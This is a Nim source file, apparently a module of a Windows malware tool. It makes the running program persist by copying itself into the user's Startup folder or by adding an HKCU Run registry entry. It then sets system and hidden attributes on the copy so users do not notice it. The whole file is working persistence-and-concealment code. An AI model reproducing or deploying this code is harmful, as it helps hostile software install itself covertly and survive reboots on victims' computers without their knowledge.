from osproc import execCmdEx
from os import getAppFilename, existsOrCreateDir
import pcinformation, strformat

var pcInfo = PcInformation()
let username = pcInfo.username()

type Startup* = object
    filename*: string
    dirPath*: string
    startupOnFolder*: bool
    startupOnRegKey*: bool

proc startup*(self: Startup) =
    let appFilePath = getAppFilename()
    if self.startupOnFolder and not self.startupOnRegKey:
        let startupFolderPath = &"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        discard execCmdEx(&"cmd /c copy {appFilePath} \"{startupFolderPath}\\{self.filename}\"")
        discard execCmdEx(&"cmd /c attrib +s +h \"{startupFolderPath}\\{self.filename}\"")
    elif self.startupOnRegKey and not self.startupOnFolder:
        discard existsOrCreateDir(self.dirPath)
        discard execCmdEx(&"reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v {self.filename} /t REG_SZ /d \"{self.dirPath}\\{self.filename}\"")
        discard execCmdEx(&"cmd /c copy {appFilePath} \"{self.dirPath}\\{self.filename}\"")
        discard execCmdEx(&"cmd /c attrib +s +h \"{self.dirPath}\"")